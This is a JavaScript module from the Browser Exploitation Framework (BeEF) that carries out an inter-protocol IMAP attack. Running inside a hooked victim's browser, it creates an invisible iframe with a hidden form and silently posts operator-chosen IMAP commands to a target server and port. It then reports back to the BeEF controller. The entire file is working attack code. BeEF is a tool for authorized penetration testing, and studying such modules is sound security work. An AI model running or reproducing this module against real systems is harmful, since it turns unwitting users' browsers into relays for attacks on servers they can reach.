//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/**
 * Inter protocol IMAP module
 * Ported from BeEF-0.4.0.0 by jgaliana (Original author: Wade)
 *
 */
beef.execute(function() {

	var server = '<%= @server %>';
	var port = '<%= @port %>';
	var commands = '<%= @commands %>';

	var target = "http://" + server + ":" + port + "/abc.html";
	var iframe = beef.dom.createInvisibleIframe();

	var form = document.createElement('form');
	form.setAttribute('name', 'data');
	form.setAttribute('action', target);
	form.setAttribute('method', 'post');
	form.setAttribute('enctype', 'multipart/form-data');

	var input = document.createElement('input');
	input.setAttribute('id', 'data1')
	input.setAttribute('name', 'data1')
	input.setAttribute('type', 'hidden');
	input.setAttribute('value', commands);
	form.appendChild(input);

	iframe.contentWindow.document.body.appendChild(form);
	form.submit();

	beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=IMAP4 commands sent");

});
